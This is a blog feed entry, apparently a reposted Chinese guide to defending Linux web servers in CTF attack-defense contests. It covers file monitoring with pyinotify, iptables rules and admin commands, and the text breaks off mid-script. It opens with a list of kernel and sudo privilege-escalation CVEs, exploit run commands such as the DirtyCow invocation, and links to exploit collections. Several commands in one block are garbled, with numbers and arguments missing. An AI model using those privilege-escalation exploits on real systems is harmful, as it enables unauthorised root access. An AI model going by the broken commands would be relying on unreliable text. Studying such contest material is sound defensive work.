<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>北极海的博客空间</title>
  
  <subtitle>You do things when the opportunities come along.</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-09T05:03:07.134Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Arcticsea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</title>
    <link href="http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/"/>
    <id>http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/</id>
    <published>2022-09-09T02:08:24.523Z</published>
    <updated>2022-09-09T05:03:07.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF线下防御战-—-让你的靶机变成“铜墙铁壁”"><a href="#CTF线下防御战-—-让你的靶机变成“铜墙铁壁”" class="headerlink" title="CTF线下防御战 — 让你的靶机变成“铜墙铁壁”"></a>CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</h1><p>发布于2018-08-03 10:46:24阅读 9850</p><blockquote><p>这篇文章特别不错，要是在安恒杯比赛之前就看了就不会被打的太惨了。</p></blockquote><hr><p><strong>一. 前言</strong></p><p>随着<a href="https://geekmubai.com/tag/ctf">CTF</a>的普及，比赛的形式也有了越来越多的花样，对于<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>来说，开始出现了安全加固或者<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>，笔者虽说没有什么很高超的攻防技巧，但也是有着一些自己的心得。本文总结了一些<a href="https://geekmubai.com/tag/ctf">CTF</a><a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>中常用的服务器加固姿势，希望能对各位<a href="https://geekmubai.com/tag/ctf">CTF</a>朋友们有所帮助。环境针对目前常见<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>常见的linux Web服务器，但是因为<a href="https://geekmubai.com/tag/ctf">CTF</a>毕竟与真实网络环境有很大区别，本文的涉及的大部分姿势不具有普遍适用性。本文涉及到的相关代码github下载地址：<a href="https://github.com/ssooking/CTFDefense">CTFDefense</a>。</p><p><strong>二. 常用姿势</strong></p><p><strong>1. 提权</strong></p><p>在开始正文之前，需要先提一下提权，这个要根据自己的比赛过程中的需要而定。有些比赛就有专门的<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>加固环节，但安全加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般一开始会给一个普通权限账号，或者干脆什么都不给，需要我们自己通过漏洞拿下服务器，这样往往就需要提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。这里有一个网站：<a href="http://exploit.linuxnote.org/">http://exploit.linuxnote.org/</a>，里面有许多linux本地提权的poc。github上有一个挺全的提权exp项目：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> 。网上也有人分享的一些打包搜集的poc,比如<a href="https://bbs.77169.com/forum.php?mod=viewthread&tid=363466">这个</a>，有兴趣的朋友可以多下载看看。</p><p>下面分享几个最近两年并且影响范围比较大的：</p><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ）</a></p><p>描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn </span><br></pre></td></tr></table></figure><p>复制</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)）</a></p><p>描述：低权限用户可修改root用户创建的文件内容，如修改 &#x2F;etc&#x2F;passwd，把当前用户的 uid 改成 0 即可提升为root权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirtyc0w file content </span><br></pre></td></tr></table></figure><p>复制</p><p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a">CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</a></p><p>描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chocobo_root </span><br></pre></td></tr></table></figure><p>复制</p><p>POC： <a href="https://www.seebug.org/vuldb/ssvid-92567">https://www.seebug.org/vuldb/ssvid-92567</a></p><p><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367">CVE-2017-1000367（sudo本地提权漏洞 ）</a></p><p>CVE-2017-1000364</p><p>描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">CVE-2016-1247（Nginx权限提升漏洞）</a></p><p>描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx&#x2F;web 的用户权限 www-data 到 root 用户权限的提升。</p><p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><p>提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。</p><p>实用脚本</p><p><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git">Linux_Exploit_Suggester.pl</a> ，它可以根据系统内核版本号返回一个包含了可能exploits的列表。还有一个检查linux安全状况的脚本：<a href="http://www.freebuf.com/sectool/108564.html">原文链接</a></p><p>还有几个详见：<a href="http://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></p><p><strong>2. 常用操作命令</strong></p><p>linux操作有很多命令，但是线下赛的防护工作中常用的也就那么一些，我们平时可以留意并总结起来，便于我们比赛使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;-p 端口&gt; 用户名@IP　　</span><br><span class="line">scp 文件路径  用户名@IP:存放路径　　　　</span><br><span class="line">tar -zcvf web.tar.gz /var/www/html/　　</span><br><span class="line">w 　　　　</span><br><span class="line">pkill -<span class="built_in">kill</span> -t &lt;用户<span class="built_in">tty</span>&gt;　　 　　</span><br><span class="line">ps aux | grep pid或者进程名　　　　</span><br><span class="line"><span class="comment">#查看已建立的网络连接及进程</span></span><br><span class="line">netstat -antulp | grep EST</span><br><span class="line"><span class="comment">#查看指定端口被哪个进程占用</span></span><br><span class="line">lsof -i:端口号 或者 netstat -tunlp|grep 端口号</span><br><span class="line"><span class="comment">#结束进程命令</span></span><br><span class="line"><span class="built_in">kill</span> PID</span><br><span class="line">killall &lt;进程名&gt;　　</span><br><span class="line"><span class="built_in">kill</span> - &lt;PID&gt;　　</span><br><span class="line"><span class="comment">#封杀某个IP或者ip段，如：.　　</span></span><br><span class="line">iptables -I INPUT -s . -j DROP</span><br><span class="line">iptables -I INPUT -s ./ -j DROP</span><br><span class="line"><span class="comment">#禁止从某个主机ssh远程访问登陆到本机，如123..　　</span></span><br><span class="line">iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　</span><br><span class="line"><span class="comment">#备份mysql数据库</span></span><br><span class="line">mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　</span><br><span class="line">mysqldump --all-databases &gt; bak.sql　　　　　　</span><br><span class="line"><span class="comment">#还原mysql数据库</span></span><br><span class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　　</span><br><span class="line">find / *.php -perm  　　 　　</span><br><span class="line">awk -F:  /etc/passwd　　　　</span><br><span class="line">crontab -l　　　　</span><br><span class="line"><span class="comment">#检测所有的tcp连接数量及状态</span></span><br><span class="line">netstat -ant|awk  |grep |sed -e  -e |<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -rn</span><br><span class="line"><span class="comment">#查看页面访问排名前十的IP</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f1 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> -　　</span><br><span class="line"><span class="comment">#查看页面访问排名前十的URL</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f4 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> - </span><br></pre></td></tr></table></figure><p>复制</p><p>再推荐两篇篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337">应急排查手册</a> ，<a href="https://xianzhi.aliyun.com/forum/mobile/read/2150.html">Linux应急响应姿势浅谈</a></p><p><strong>3. 文件监控防webshell</strong></p><p><a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>webshell，我们可以监控我们的web目录，对文件的增加或修改等操作进行限制等，粗暴一点的话，就禁止任何文件产生变化，杜绝被传webshell的可能性。</p><p><strong>（1）使用系统 chattr +i 命令</strong></p><p>linux下的文件有着隐藏属性，可以用lsattr命令查看。其中有一个i属性，表示不得更动任意文件或目录。如果你已经有root或者sudo权限了，那么你可以使用”chattr +i 命令”修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括root），如果想进行修改，必须用命令”chattr -i”取消隐藏属性。</p><p><a href="http://www.runoob.com/linux/linux-comm-chattr.html">Linux文件保护禁止修改、删除、移动文件等,使用chattr +i保护</a></p><p>例子：</p><p>用chattr命令防止系统中某个关键文件被修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /etc/profile </span><br></pre></td></tr></table></figure><p>复制</p><p>将&#x2F;var&#x2F;www&#x2F;html目录下的文件设置为不允许任何人修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr -R +i /var/www/html </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（2）自己动手丰衣足食</strong></p><p>python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，<strong>线下赛中通常没法联网安装库</strong>，所以我们可以手工把库文件传到靶机里python库中: &#x2F;usr&#x2F;lib&#x2F;pythonXXX&#x2F;site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。</p><p>安装了pyinotify库之后，我们仅仅运行在机器上： “python -m pyinotify 监控目录路径” 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。</p><p>但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以自己编程，针对性地实现我们需要的功能，下面是一段代码示例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> WatchManager, Notifier,ProcessEvent</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> IN_DELETE, IN_CREATE,IN_MOVED_TO,IN_ATTRIB</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EventHandler</span>(<span class="title class_ inherited__">ProcessEvent</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;事件处理&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#创建</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_CREATE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Create : &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line">        <span class="comment">#删除</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_DELETE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Delete : &quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#文件属性被修改，如chmod、chown命令</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_ATTRIB</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Attribute been modified:&quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#文件被移来，如mv、cp命令</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_MOVED_TO</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] File or dir been moved to here: &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteFileOrDir</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(target):</span><br><span class="line">        fileslist = os.listdir(target)</span><br><span class="line">        <span class="keyword">for</span> files <span class="keyword">in</span> fileslist:</span><br><span class="line">            DeleteFileOrDir(target + <span class="string">&quot;/&quot;</span> + files)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.rmdir(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete directory successfully: &quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete directory failed: &quot;</span> + target</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(target):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete file successfully&quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete file filed:  &quot;</span> + target</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Monitor</span>(<span class="params">path</span>):</span><br><span class="line">        wm = WatchManager()</span><br><span class="line">        mask = IN_DELETE | IN_CREATE | IN_MOVED_TO | IN_ATTRIB</span><br><span class="line">        notifier = Notifier(wm, EventHandler())</span><br><span class="line">        wm.add_watch(path, mask,rec=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Now Starting Monitor:  %s&#x27;</span>%(path)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        notifier.process_events()</span><br><span class="line">                        <span class="keyword">if</span> notifier.check_events():</span><br><span class="line">                                notifier.read_events()</span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                        notifier.stop()</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        usage=<span class="string">&quot;%(prog)s -w [path]&quot;</span>,</span><br><span class="line">        description=(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            Introduce：Simple Directory Monitor!  by ssooking&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;--watch&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,dest=<span class="string">&quot;path&quot;</span>,default=<span class="string">&quot;/var/www/html/&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;directory to watch,default is /var/www/html&quot;</span>)</span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    Monitor(args.path) </span><br></pre></td></tr></table></figure><p>复制</p><p>关于pyinotify 库的用法不再赘述，可以看到我在上述代码中创建了一个事件监控处理的类EventHandler，在这个示例中，我们仅仅关注创建、删除、修改属性、移动操作事件，并且我定义了一个DeleteFileOrDir方法用于自动删除增加的目录或者文件。运行测试截图：</p><p>我们可以编写功能更加细化的程序，实现如：</p><p>监控文件变更，</p><p>禁止创建、修改、删除任何文件或目录，</p><p>自动删除新增文件，</p><p>把被修改的文件改回去,</p><p>删除畸形隐藏文件等功能。我们使用pyinstaller把我代码打包为linux的elf可执行文件。-F参数表示打包为独立可运行文件，命令执行完之后自动生成：build、dist文件夹和SimpleMonitor.spec文件，你可以在dist目录里找到生成的elf程序。</p><p>打包的文件在CTFDefense项目的Monitor目录下</p><p><strong>4. 网络监控断异常连接</strong></p><p>linux安全防护一定少不了 iptables了，使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p><p>具体我们可以做哪些工作呢，举一些例子：</p><p><strong>（1）关闭所有网络端口，只开放一些比赛的必要端口，也可以防止后门的连接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开放ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#打开80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#开启多端口简单用法</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（2）限制ssh登陆，进行访问控制</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机</span><br><span class="line">iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（3）限制IP连接数和连接速率</strong></p><p>我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问+_+</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单个IP的最大连接数为 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#单个IP在60秒内只允许最多新建15个连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --limit-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT </span><br></pre></td></tr></table></figure><p>复制</p><p>再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问</p><p><strong>（4）数据包简单识别，防止端口复用类的后门或者shell</strong></p><p>假设病毒木马程序通过22，80端口向服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（5）限制访问</strong></p><p>如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务</span><br><span class="line"><span class="comment">#封杀123.4.5.6这个IP或者某个ip段</span></span><br><span class="line">iptables -I INPUT -s 123.4.5.6 -j DROP</span><br><span class="line">iptables -I INPUT -s 123.4.5.1/24 -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（6）过滤异常报文</strong></p><p>iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　<span class="comment">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span></span><br><span class="line">iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 <span class="comment">#匹配SYN标识位</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 <span class="comment">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 <span class="comment">#丢弃没标志位的包</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　<span class="comment">#匹配到SYN ACK FIN URG的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　<span class="comment">#匹配到SYN ACK FIN RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　<span class="comment">#匹配到SYN FIN PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　<span class="comment">#匹配到SYN FIN RST PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　<span class="comment">#匹配到 SYN,RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 <span class="comment">#匹配到 SYN,FIN的丢弃 </span></span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（7）防DDOS攻击</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line">　　-m <span class="built_in">limit</span>: 启用<span class="built_in">limit</span>扩展</span><br><span class="line">　　–<span class="built_in">limit</span> 20/minute: 允许最多每分钟10个连接</span><br><span class="line">　　–limit-burst 100: 当达到100个连接后，才启用上述20/minute限制 </span><br></pre></td></tr></table></figure><p>复制</p><p>丢弃陌生的TCP响应包,防止反弹式攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p>更多的姿势，需要打开我们的脑洞了，下面是一个通用的firewall脚本，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 